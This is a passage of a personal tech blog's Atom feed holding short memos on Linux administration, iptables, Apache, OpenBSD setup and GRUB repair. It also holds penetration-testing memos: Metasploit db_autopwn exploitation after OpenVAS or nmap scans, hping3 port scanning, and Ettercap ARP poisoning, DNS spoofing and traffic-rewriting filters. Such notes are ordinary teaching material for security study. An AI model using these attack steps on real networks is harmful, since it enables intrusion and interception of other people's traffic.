	<li><strong>$pos = WinGetPos(&#8220;Untitled - Notepad&#8221;)</strong></li>
</ul>
<p style="padding-left: 30px;">Get the position of the given window (in this case Notepad)</p>
<p style="padding-left: 30px;">x=pos[0], y=pos[1], width=pos[2], height=post[3]</p>
<br/>
<ul>
	<li><strong>MouseClick(&#8220;left&#8221;,100,100)</strong></li>
</ul>
<p style="padding-left: 30px;">Execute a left click to the given coordinate</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Networked Services memo]]></title>
    <link href="http://www.robindavid.fr/blog/2010/11/14/networked-services/"/>
    <updated>2010-11-14T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/11/14/networked-services</id>
    <content type="html"><![CDATA[<h3>Basic admin</h3>

<ul>
	<li><strong>?</strong> -&gt; wildcard for one char</li><br/>
	<li><strong>chgrp</strong>: change the group of a file or a folder</li><br/>
	<li><strong>du -s -h [folder] </strong> give you the total file size of the folder or a file</li><br/>
	<li><strong>umask</strong> example to give rwx-r-x&#8212;x (751) umask -&gt; 026</li><br/>
	<li><strong>sort -n -k 4 -t &#8220;:&#8221;</strong> : sort numerically using the column 4 using the character separator &#8220;:&#8221;</li><br/>
	<li><strong>find /home -newer file </strong> Find in /home files newer than &#8220;file&#8221;</li><br/>
	<li><strong>find /usr/ -size -2 -exec cp {} /home/ \; </strong> find in /usr files lower than 2 blocs and copy them to /home/</li><br/>
	<li><strong>egrep &#8220;a.*e.*i.*u.*o&#8221; /root/words </strong> grep lines containing in the order a e i o u</li><br/>
	<li><strong>egrep &#8220;(.{4}).*\1&#8221; /root/words </strong> grep lines containing at least two times the same pattern of 4 chars</li><br/>
	<li><strong>pidof syslogd </strong> get the pidof syslog</li><br/>
	<li><strong>chkconfig &#8211;list</strong> list the services theirs run level etc</li><br/>
	<li><strong>tcpdump -i eth0 not port 23 and not port 22 </strong> capture traffic of eth0 but not incoming from port 22 and 23</li><br/>
	<li><strong>ip route</strong>: show a basic routing table</li>
</ul>
<br/><br/>

<h3>Networking</h3>
<ul>
	<li>Configuring manually ip with ifconfig:
<ul>
	<li><strong>ifconfig eth0 10.0.50.10 broadcast 10.0.50.255 netmask 255.255.255.0</strong></li>
</ul>
</li><br/>
	<li>Configuring manually ip with ip:
<ul>
	<li><strong>ip route append 10.0.50.10 dev eth0 table main</strong></li>
	<li><strong>ip route append default via 10.0.50.254</strong></li>
</ul>
</li><br/>
	<li><strong>route -n</strong>: show the routing table</li><br/><li><strong>cat /proc/net/arp</strong>: show MAC address, in memory</li>
	<li>Run level directory: <strong>/etc/rd?.d</strong></li>
	<li>Runlevel states are:</li>
	<li>
<ul>
	<li>– D uninterruptible sleep (usually IO)</li>
	<li>– R runnable (on run queue)</li>
	<li>– S sleeping</li>
	<li>– T traced or stopped</li>
	<li>– W paging</li>
	<li>– X dead</li>
	<li>– Z a defunct (&#8220;zombie&#8221;) process</li>
	<li>– W has no resident pages</li>
	<li>– &lt; high-priority process</li>
	<li>– N low-priority task</li>
	<li>– L has pages locked into memory (for real-time and custom IO)</li>
</ul>
</li><br/>
	<li>Change runlevel for X:
<ul>
	<li><strong>chkconfig &#8211;levels 345 X off</strong></li>
</ul>
</li>
</ul><br/><br/>
<h3>Firewall</h3>
#!/bin/bash<br/>
<br/>
iptables -F INPUT<br/>
iptables -F OUTPUT<br/>
iptables -F FORWARD<span style="color: #0000ff;">#flush all rules</span><br/>
<br/>
iptables -P INPUT ACCEPT<br/>
iptables -P OUTPUT ACCEPT<br/>
iptables -P FORWARD DROP<span style="color: #0000ff;">#define a default policy for a chain</span><br/>
<br/>
iptables -A INPUT -i eth0 -p tcp &#8211;dport http -j DROP <span style="color: #0000ff;">#drop all the incoming http traffic on eth0</span><br/>
iptables -A INPUT -i eth0 -p tcp -s 20.0.0.0/24 -j DROP <span style="color: #0000ff;">#drop all incoming connection from the given network</span><br/>
<br/>
iptables -A INPUT -p icmp &#8211;icmp-type echo-request -m limit &#8211;limit 1/second -j ACCEPT<br/>
iptables -A INPUT -p icmp &#8211;icmp-type echo-request -j DROP <span style="color: #0000ff;">#accept ping at a limit of 1 per second</span><br/>
<br/>
iptables -A INPUT -i eth0 -p tcp &#8211;dport ssh -s ! 10.200.0.1 -j REJECT<span style="color: #0000ff;">#reject all incoming ssh connection except coming from 10.200.0.1(don&#8217;t mean it&#8217;s accepted</span><br/>
iptables -A INPUT -i eth0 -p tcp &#8211;dport ssh -s ! 10.0.0.0/16 -j ACCEPT<span style="color: #0000ff;">#accept all incoming ssh connection which come from anywhere else than 10.0.0.0/16 (so 10.200.0.1 accepted)</span><br/>
<br/>
iptables -A INPUT -m state &#8211;state ESTABLISHED,RELATED -j ACCEPT<span style="color: #0000ff;">#accpet incoming, related or established connection</span><br/>




<br/><br/>

<h3>Apache</h3>
<ul>
	<li><strong>UserDir disable</strong> Comment it in httpd.conf or apache2.conf to allow users public_html</li>
	<li><strong>NameVirtualHost *:80</strong> Uncomment it in the case it is</li>
	<li><strong>Basic virtual host</strong></li>
</ul>
<div id="_mcePaste" style="padding-left: 30px;">&lt;VirtualHost *:80&gt;</div>
<div id="_mcePaste" style="padding-left: 60px;">ServerAdmin robin@robindavid.fr</div>
<div id="_mcePaste" style="padding-left: 60px;">DocumentRoot /home/robin/public_html/web</div>
<div id="_mcePaste" style="padding-left: 60px;">ServerName mywebsite.robindavid.fr</div>
<div style="padding-left: 60px;">ErrorLog logs/mywebsite.robindavid.fr-error_log</div>
<div id="_mcePaste" style="padding-left: 60px;">CustomLog logs/mywebsite.robindavid.fr-access_log common</div>
<div id="_mcePaste" style="padding-left: 30px;">&lt;/VirtualHost&gt;</div>
<div></div><br/>
<div>
<ul>
	<li><strong>More complex virtual host</strong></li>
</ul>
<div style="padding-left: 30px;">&lt;VirtualHost *:80&gt;</div>
<div style="padding-left: 60px;">ServerAdmin robin@robindavid.fr</div>
<div id="_mcePaste" style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 60px; margin: 0px;">DocumentRoot /home/robin/public_html/web</div>
<div id="_mcePaste" style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 60px; margin: 0px;">ServerName mywebsite.robindavid.fr</div>
<div>
<div style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 60px; margin: 0px;">ErrorLog logs/mywebsite.robindavid.fr-error_log</div>
<div id="_mcePaste" style="padding-top: 0px; padding-right: 0px; padding-bottom: 0px; padding-left: 60px; margin: 0px;">CustomLog logs/mywebsite.robindavid.fr-access_log common</div>
</div>
<div style="padding-left: 60px;">ServerAlias web.robindavid.fr <span style="color: #0000ff;">#give virtual host alias</span></div>
<div style="padding-left: 60px;"><span style="color: #0000ff;"> </span>RewriteEngine on<span style="white-space: pre;"> </span><span style="color: #0000ff;">#activate rewrite engine</span></div>
<div style="padding-left: 60px;"><span style="color: #0000ff;"> </span>RewriteCond %{HTTP_HOST} ^website&#46;<span style="white-space: pre;"> </span><span style="color: #0000ff;">#if host address start by website</span><span style="white-space: pre;"> </span></div>
<div style="padding-left: 60px;"><span style="white-space: pre;"> </span>RewriteCond %{REQUEST_URI} !~robin<span style="white-space: pre;"> </span><span style="color: #0000ff;">#and uri does not contain ~robin</span></div>
<div style="padding-left: 60px;"><span style="color: #0000ff;"> </span>RewriteRule ^(.*)$ http://redirect.robindavid.fr$1 [L,R]<span style="white-space: pre;"> </span><span style="color: #0000ff;">#redirect the host to the given host keeping the same path</span></div>
<div style="padding-left: 30px;">&lt;/VirtualHost&gt;</div>
<div style="padding-left: 30px;"></div><br/><br/>

<div>
<ul>
	<li>Allow user to use authentication. Add before # &lt;Directory /home/*/public_html&gt;:</li>
</ul>
<div style="padding-left: 60px;">&lt;Directory /home/*/public_html&gt;</div>
<div style="padding-left: 60px;">AllowOverride AuthConfig</div>
<div style="padding-left: 60px;">&lt;/Directory&gt;</div>
<div style="padding-left: 60px;"></div>
</div><br/>

<div>
<ul>
	<li><strong>htpasswd -s mypassfile richard</strong>
<ul>
	<li>#add user richard in mypassfile</li>
	<li># -s force usage of SHA(optionnal)</li>
</ul>
</li>
</ul>
</div><br/>
<div>
<ul>
	<li>Then in the folder you want to secure create a file .htaccess and put in:</li>
</ul>
<div style="padding-left: 30px;">AuthType Basic</div>
<div style="padding-left: 30px;">AuthName &#8220;Restricted Fodler !&#8221;</div>
<div style="padding-left: 30px;">AuthUserFile /home/robin/mypassfile</div>
<div style="padding-left: 30px;">Require user richard</div>
<div style="padding-left: 30px;"></div>
</div>
</div>
<ul>
	<li>For groups it&#8217;s quite the same create a file in call mygroup
<ul>
	<li>put in magic: richard</li>
	<li>mean that richard is in the group magic</li>
</ul>
</li>
</ul>
<ul>
	<li>And the two following lines to the existing .htaccess
<ul>
	<li>AuthGroupFile /home/robin/mygroup</li>
	<li>Require group magic</li>
</ul>
</li>
</ul>]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Setup a proper OpenBSD]]></title>
    <link href="http://www.robindavid.fr/blog/2010/10/15/setup-a-proper-openbsd/"/>
    <updated>2010-10-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/10/15/setup-a-proper-openbsd</id>
    <content type="html"><![CDATA[<br/>Just after the OpenBSD install, the packet manager is not setup, the ntfs support is not patched in the kernel..
Following the instructions you will be able to have an operationnal OpenBSD quick.

<span style="color: #0000ff;">Note: All operations have been done with OpenBSD 4.6 on an i386 architecture. Replace it with your version and your architecture.</span><br/><br/>
<div id="_mcePaste">
<ul>
	<li><strong>echo &#8220;export PKG_PATH=ftp://ftp.fr.openbsd.org/pub/OpenBSD/4.6/packages/`machine -a` &gt;&gt; ~/.profile</strong></li>
</ul>
</div>
<div id="_mcePaste" style="padding-left: 30px;">It setup the path for repository. (It will be setup by reloading your console).</div>
<div style="padding-left: 30px;"></div><br/>
<div>
<ul>
	<li>activate wsmoused in /etc/rc.conf to get the mouse in console.</li><br/>
	<li>To increase the screen console resolution do :</li>
</ul>
<div style="padding-left: 60px;"><strong>echo &#8220;wsfontload -h 8 -e ibm /usr/share/misc/pcvtfonts/vt220l.808&#8221; &gt;&gt; /etc/rc.local</strong></div>
<div style="padding-left: 60px;"><strong>echo &#8220;wsconscfg -dF 5&#8221; &gt;&gt; /etc/rc.local</strong></div>
<div style="padding-left: 60px;"><strong>echo &#8220;wsconscfg -t 80x50 5&#8221; &gt;&gt; /etc/rc.local</strong></div>
<div></div><br/>
<div>
<ul>
	<li>By default OpenBSD never shutdown, but always reboot, if you want to change this behavior edit /etc/rc.shutdown to allow to shutdown.</li><br/>
	<li>To activate web server edit /etc/rc.conf</li><br/>
	<li>To generate rsa certificate for the server use :</li>
</ul>
</div>
<div style="padding-left: 30px;"><strong>openssl genrsa -out /etc/ssl/private/server.key 2048</strong></div>
<div style="padding-left: 30px;"><strong>openssl req -new -key /etc/ssl/private/server.key -out /etc/ssl/private/server.csr</strong></div>
<div style="padding-left: 30px;">And if you want to sign your CSR use :</div>
<div style="padding-left: 30px;"><strong>openssl x509 -req -days 365 -in /etc/ssl/private/server.csr -signkey /etc/ssl/private/server.key -out /etc/ssl/server.crt</strong></div>
<div></div><br/>
<div>
<ul>
	<li>To activate binary compatibility with linux uncomment the &#8220;kern.emul.linux&#8221; lines in rc.confg or sysctl.conf (I never remember ^^).</li><br/>
	<li>If you run an i386 system you can activate ntfs read-only support in the kernel:</li>
</ul>
</div>
<div style="padding-left: 30px;"><strong>cd /usr</strong></div>
<div style="padding-left: 30px;"><strong>ftp ftp://ftp.fr.openbsd.org/pub/OpenBSD/4.6/sys.tar.gz</strong></div>
<div style="padding-left: 30px;"><strong>cd src/</strong></div>
<div style="padding-left: 30px;"><strong>tar xzf ../sys.tar.gz</strong></div>
<div style="padding-left: 30px;"><strong>rm ../sys.tar.gz</strong></div>
<div></div>
<div></div>
<div style="padding-left: 30px;"><strong>cd /usr/src/sys/arch/i386/conf</strong></div>
<div style="padding-left: 30px;"><strong>config GENERIC</strong></div>
<div style="padding-left: 30px;"># edit GENERIC and activate option in</div>
<div style="padding-left: 30px;"><strong>cd ../compile/GENERIC</strong></div>
<div style="padding-left: 30px;"><strong>make clean &amp;&amp; make depend &amp;&amp; make</strong></div>
<div style="padding-left: 30px;"><strong>make install</strong></div>
<div></div><br/>
<div>
<ul>
	<li>Create the tree of ports</li>
</ul>
</div>
<div style="padding-left: 30px;"><strong>cd /tmp</strong></div>
<div style="padding-left: 30px;"><strong>ftp ftp://ftp.fr.openbsd.org/pub/OpenBSD/4.6/ports.tar.gz</strong></div>
<div style="padding-left: 30px;"><strong>cd /usr</strong></div>
<div style="padding-left: 30px;"><strong>tar xzf /tmp/ports.tar.gz</strong></div>
</div>
<div></div><br/>
<div>Your system is now more or less ready to run, you have package manager configured, your tree of ports and few options activated. It&#8217;s preferable to reboot the machine, to activate all changes.</div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Repair grub 2 with chroot]]></title>
    <link href="http://www.robindavid.fr/blog/2010/10/15/repair-grub-2-with-chroot/"/>
    <updated>2010-10-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/10/15/repair-grub-2-with-chroot</id>
    <content type="html"><![CDATA[<ul>
	<li><strong>mount -o bind /dev /mnt/dev</strong></li>
	<li><strong>mount -o bind /proc /mnt/proc</strong></li>
	<li><strong>mount sysfs /mnt/sys -t sysfs</strong></li>
	<li><strong>chroot /bin/bash /</strong></li>
</ul>

<p>and in the chrooted shell :</p>

<ul>
	<li><strong>grub-install /dev/sda</strong></li>
	<li><strong>grub-setup</strong></li>
	<li><strong>update-grub2</strong></li>
</ul>
<p><span style="color: #0000ff;">Note: In this example I install the MBR on /dev/sda but if it&#8217;s not your case you can change.</span></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OpenVAS memo]]></title>
    <link href="http://www.robindavid.fr/blog/2010/10/15/openvas-memo/"/>
    <updated>2010-10-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/10/15/openvas-memo</id>
    <content type="html"><![CDATA[OpenVAS is more or less the equivalent for Nessus, in the free world. Let&#8217;s try to do an audit of a server.
<br/><h5>OpenVAS audit</h5>
<ul>
	<li>On the server :
<ul>
	<li>install :
<ul>
	<li><strong>openvas-server</strong> and <strong>openvas-plugins</strong></li>
</ul>
</li>
	<li>Update plugins :
<ul>
	<li><strong>openvas-nvt-sync</strong></li>
</ul>
</li>
	<li>Create a server certificate :
<ul>
	<li><strong>openvas-mkcert</strong></li>
</ul>
</li>
	<li>Create a user :
<ul>
	<li><strong>openvas-adduser</strong></li>
</ul>
</li>
	<li>Finally launch the deamon :
<ul>
	<li><strong>openvasd -D</strong></li>
</ul>
</li>
</ul>
</li>
	<li>On the client :
<ul>
	<li>Install :
<ul>
	<li><strong>openvas-client</strong> (or something like that)</li>
</ul>
</li>
	<li>launch :
<ul>
	<li><strong>OpenVAS-Client</strong></li>
</ul>
</li>
</ul>
</li>
	<li>Create a task and a scope on the client. Activate all plugins, connect to the server and launch the audit. Wait &#8230;</li>
	<li>Save the result in the Nessus format. To do this select the result and do export in &#8220;nbe&#8221; format.</li>
</ul><br/>
Now that we have retrieve lot&#8217;s of informations about the server, we just have to try to exploit them with metasploit.

On the client launch :<strong> msfconsole</strong>
<br/>
<span style="color: #0000ff;">Note: You need to install the metasploit framework before.</span>
<ul>
	<li>In the msfconsole prompt try to create a new database with :</li>
</ul>
<p style="padding-left: 30px;"><strong>db_connect my_scan</strong></p>
<p style="padding-left: 30px;"><span style="color: #0000ff;">Note : If everything works fine you&#8217;re lucky, otherwise you should try to find the missing packet or shared library. Considering that the sql database use is sqlite.</span></p>

<ul>
	<li>You should now import the report :</li>
</ul>
<p style="padding-left: 30px;"><strong>db_import_nessus_nbe report.nbe</strong></p>
<p style="padding-left: 30px;"></p>

<ul>
	<li>You could see somes report informations with the following commands:</li>
</ul>
<p style="padding-left: 30px;"><strong>db_vulns,db_services,db_hosts</strong></p>

<ul>
	<li>You now just have to launch the autopwn:</li>
</ul>
<p style="padding-left: 30px;"><strong>db_autopwn -t -x -b -e</strong></p>

<ul>
	<li>If vulnerability are successfully exploited sessions are created(with a meterpreter session for ex). To see sessions type :</li>
</ul>
<p style="padding-left: 30px;"><strong>sessions -l</strong></p>

<ul>
	<li>And select anyone with :</li>
</ul>
<p style="padding-left: 30px;"><strong>sessions -i [number]</strong></p>
<br/><br/>
<h5>Another alternative is to use nmap to create the report</h5>
By this way you don&#8217;t need to install anything on the server. You just need nmap on the client.
<ul>
	<li>We create a new database :
<ul>
	<li><strong>db_connect scan_nmap</strong></li>
</ul>
</li>
	<li>Launch the scan of  the server :
<ul>
	<li><strong>db_nmap -T4 -F 192.168.1.0-254</strong></li>
</ul>
</li>
	<li>Like above we can see informations with these commands :
<ul>
	<li><strong>db_hosts,db_services,db_vulns</strong></li>
</ul>
</li>
	<li>We launch the autopwn :
<ul>
	<li><strong>db_autopwn -t -p -b -e</strong></li>
</ul>
</li>
	<li>If exploitation succeed sessions are created :
<ul>
	<li><strong>sessions -l</strong></li>
</ul>
</li>
	<li>And you can connect to with :
<ul>
	<li><strong>sessions -i [number]</strong></li>
</ul>
</li>
</ul>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hping3 memo]]></title>
    <link href="http://www.robindavid.fr/blog/2010/10/15/hping3-memo/"/>
    <updated>2010-10-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/10/15/hping3-memo</id>
    <content type="html"><![CDATA[Below a memo about hping3&#8230;
<div id="_mcePaste">
<ul>
	<li>Importants options :
<ul>
	<li><strong>-i</strong> define the interval time between each packet in sec.</li>
	<li><strong>-c</strong> define the number of packets to send (without wait Ctrl+c to end)</li>
	<li><strong>-V</strong> verbose mode</li>
	<li><strong>-p</strong> port</li>
	<li><strong>-2</strong> for UDP (without it&#8217;s TCP)</li>
	<li>But there is too:
<ul>
	<li><strong>-0</strong> raw ip</li>
	<li><strong>-1</strong> icmp</li>
	<li><strong>-8</strong> scan</li>
	<li><strong>-9</strong> listen mode</li>
</ul>
</li>
	<li><strong>-d</strong> Allow to change the body size of the packet (default 0)</li>
	<li><strong>-S</strong> to put SYN flag to 1, but there is too -A for ACK, R RST, P PUSH, F FIN et U URG</li>
</ul>
</li>
</ul>
</div>
<div id="_mcePaste">
<ul>
	<li>Few examples :
<ul>
	<li><strong>hping3 -V -c 1 -2 -p 2048 192.168.1.15</strong></li>
	<li>Send one UDP packet on the port 2048 of the host 192.168.1.15.</li>
	<li><strong>hping3 -c 1 -S -p 23 192.168.1.15</strong></li>
	<li>Use the flag SYN (-S), to try establish a connection (if server return syn=1 ack=1 port is open)</li>
	<li><strong>hping3 -S 192.168.1.15 -p ++21</strong></li>
	<li>Scan the specified host from port 21</li>
	<li><span style="color: #0000ff;">Note: Hping print just those who answer (SA)</span></li>
	<li><strong>hping3 -V &#8211;scan &#8220;20-90&#8221; -S 192.168.1.15</strong></li>
	<li>Scan a port range (20-90)</li>
</ul>
</li>
</ul>
</div>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Ettercap memo]]></title>
    <link href="http://www.robindavid.fr/blog/2010/10/15/ettercap-memo/"/>
    <updated>2010-10-15T00:00:00+00:00</updated>
    <id>http://www.robindavid.fr/blog/2010/10/15/ettercap-memo</id>
    <content type="html"><![CDATA[<h2>ARP poisoning</h2>

<ol>
<li>Launch ettercap in root</li>
<li>Sniff/Unified .. / eth0</li>
<li>Host/scan for hosts (do it multiples times to find more</li>
<li>Host list to see all available hosts</li>
<li>Add the gateway in target 1</li>
<li>Add the victim in target 2</li>
<li>Menu mitm / arp poisoning</li>
</ol>


<h2>DNS Poisoning</h2>

<p>edit <em>/usr/local/share/ettercap/etter.dns</em> or <em>/usr/share/ettercap/etter.conf</em>
and change for instance:</p>

<p>microsoft.com A 198.12.196.56</p>

<p>by</p>

<p>microsoft.com A 192.168.1.16</p>

<p>Don&rsquo;t forget to activate <strong>DNS Spoof</strong> in plugins</p>

<h2>Filters</h2>

<p>Allow to change word on the fly in trafic</p>

<ol>
<li>edit <em>/usr/local/share/ettercap/etter.filter</em> or <em>/usr/share/ettercap/etter.filter</em></li>
<li>Add for instance:</li>
</ol>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if (ip.proto == TCP && search(DATA.data, "rocks") ) {
</span><span class='line'>    log(DATA.data, "/tmp/alter_ettercap.log");
</span><span class='line'>    replace("rocks", "sucks");
</span><span class='line'>    msg("Rocks substituted and logged.\n");
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>The filter file shoud then be &ldquo;compiled&rdquo; with: <strong>etterfilter -o fichier.ef etter.filter</strong></p>

<p>And load the filter in filter/load a filter</p>
]]></content>
  </entry>
  
</feed>
